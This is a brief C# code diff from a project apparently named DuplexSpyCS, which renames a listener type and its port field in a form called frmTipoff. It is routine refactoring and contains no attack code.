@@ -38,7 +38,7 @@ namespace DuplexSpyCS
          * .o0o.---------------[ README ]---------------.o0o.
          */
 
-        private Listener m_listener;
+        private clsTcpListener m_listener;
 
         /// <summary>
         /// Send request mode.
@@ -75,7 +75,7 @@ namespace DuplexSpyCS
         public List<ILiveDevice> m_lsDevice;
         public List<NetworkInterface> m_lsNetworkInterface;
 
-        public frmTipoff(Listener l)
+        public frmTipoff(clsTcpListener l)
         {
             m_listener = l;
 
@@ -399,7 +399,7 @@ namespace DuplexSpyCS
                 try
                 {
                     textBox1.Text = "127.0.0.1";
-                    numericUpDown2.Value = m_listener.port;
+                    numericUpDown2.Value = m_listener.m_nPort;
                 }
                 catch
                 {
